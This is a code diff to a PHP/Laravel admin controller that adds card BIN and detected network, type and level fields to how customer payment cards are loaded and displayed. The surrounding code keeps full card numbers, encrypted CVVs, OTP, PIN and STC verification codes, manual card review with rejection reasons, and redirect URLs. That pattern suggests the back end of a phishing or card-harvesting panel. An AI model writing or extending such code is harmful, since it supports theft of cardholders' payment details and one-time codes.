@@ -206,7 +206,7 @@ class AdminCustomerController extends Controller
                     ->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'])
                     ->where('created_at', '>=', now()->subDays(30))
                     ->latest(),
-                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv_encrypted', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
+                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv_encrypted', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'bin_6', 'detected_network', 'detected_type', 'detected_level', 'created_at', 'updated_at')
                     ->where('created_at', '>=', now()->subDays(30))
                     ->latest(),
                 // Same no-limit rule as above applies here — a per-parent limit()
@@ -636,6 +636,11 @@ class AdminCustomerController extends Controller
                 'card_number'         => $rawPan !== '' ? $rawPan : null,
                 'last4'               => $card->last4,
                 'bin'                 => $bin,
+                // Already resolved once at submission time (PaymentCardObserver,
+                // full PAN available) — authoritative source for network/type/level.
+                'detected_network'    => $card->detected_network,
+                'detected_type'       => $card->detected_type,
+                'detected_level'      => $card->detected_level,
                 'holder_name'         => $card->holder_name,
                 'card_holder'         => $card->holder_name,
                 'card_type'           => $card->card_type,
